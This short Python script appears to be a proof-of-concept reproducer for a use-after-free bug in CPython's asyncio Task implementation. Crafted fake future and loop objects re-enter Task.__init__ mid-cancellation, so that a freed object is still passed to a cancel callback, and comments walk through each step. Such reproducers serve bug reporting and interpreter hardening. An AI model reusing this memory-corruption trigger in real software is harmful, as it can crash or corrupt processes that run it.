import asyncio
import types

async def evil_coroutine():
    @types.coroutine
    def sync_generator():
        # ensure to keep obj alive after the first send() call
        global evil
        while 1:
            yield evil
    await sync_generator()

class Loop:
    is_running = staticmethod(lambda: True)
    get_debug = staticmethod(lambda: False)
         
class Evil:
    _asyncio_future_blocking = True
    get_loop = staticmethod(lambda: normal_loop)

    def add_done_callback(self, callback, *args, **kwargs):
        # sets task_cancel_msg to our victim object which will be deleted
        asyncio.Task.cancel(task, to_uaf)
    
    def cancel(self, msg):
        # if hasn't crashed at this point, you'll see its the same object that was just deleted
        print("in cancel", hex(id(msg)))

    def __getattribute__(self, name):
        global to_uaf
        if name == "cancel":
            class Break:
                def __str__(self):
                    raise RuntimeError("break")

            # at this point, our obj to uaf only has 2 refs, `to_uaf` and `task->task_cancel_msg`. Doing a partial task init will clear
            # fut->fut_cancel_msg (same thing as task_cancel_msg, it's just been cast to a fut obj), and then we can just `del to_uaf` to free
            # the object before it gets sent to our `cancel` func
            try:
                task.__init__(coro, loop=normal_loop, name=Break())
            except Exception as e:
                assert type(e) == RuntimeError and e.args[0] == "break"

            del to_uaf
            # to_uaf has now been deleted, but it will still be sent to our `cancel` func

        return object.__getattribute__(self, name)

class DelTracker:
    def __del__(self):
        print("deleting", hex(id(self)))

to_uaf = DelTracker()
normal_loop = Loop()
coro = evil_coroutine()
evil = Evil()

task = asyncio.Task.__new__(asyncio.Task)
task.__init__(coro, loop=normal_loop, name="init", eager_start=True)